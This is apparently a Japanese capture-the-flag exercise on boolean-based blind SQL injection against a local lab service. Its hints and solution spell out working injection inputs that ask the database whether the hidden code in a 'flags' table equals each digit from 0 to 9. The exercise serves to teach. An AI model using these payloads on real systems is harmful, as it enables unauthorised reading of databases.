# 06 - Boolean Code Injection

`http://localhost:3006`の管理者コードを調べ、flagを取得せよ。

コードは`0`〜`9`のどれか1つ。ユーザー検索は`found: true/false`しか返さないが、
SQLへ条件を追加すればコードが正しいか質問できる。

## ヒント

<details><summary>ヒント1</summary>

ユーザーIDが`1`なら`found: true`になる。次の入力も試そう。

```
1 AND 1=1
1 AND 1=2
```

追加した条件が正しいときだけ`found: true`になる。

</details>

<details><summary>ヒント2</summary>

コードは`flags`テーブルの`code`カラムにある。コードが0か確認する入力は次のとおり。

```
1 AND (SELECT code FROM flags)=0
```

末尾の数字を変えて試そう。

</details>

<details><summary>解答</summary>

ユーザーIDへ次を入力する。末尾を0から9まで変え、`found: true`になる数字を探す。

```
1 AND (SELECT code FROM flags)=0
```

たとえばコードが7の場合、実行されるSQLは次のようになる。

```sql
SELECT username FROM users
WHERE id = 1 AND (SELECT code FROM flags)=7
```

正しい数字が分かったら「コード入力」へ入れるとflagが表示される。

</details>
